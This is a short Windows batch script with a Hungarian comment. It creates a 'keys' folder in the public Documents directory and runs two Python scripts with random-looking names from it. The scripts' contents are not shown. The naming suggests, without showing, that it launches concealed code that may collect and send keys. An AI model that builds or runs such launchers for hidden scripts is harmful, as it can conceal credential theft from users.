@echo off

:: nyelvfüggetlen célmappa
set "TARGET=%PUBLIC%\Documents\keys"
if not exist "%TARGET%" mkdir "%TARGET%"

python "%TARGET%\spwww743g7w.py"
python "%TARGET%\fwsendbfgw.py"

echo.
pause
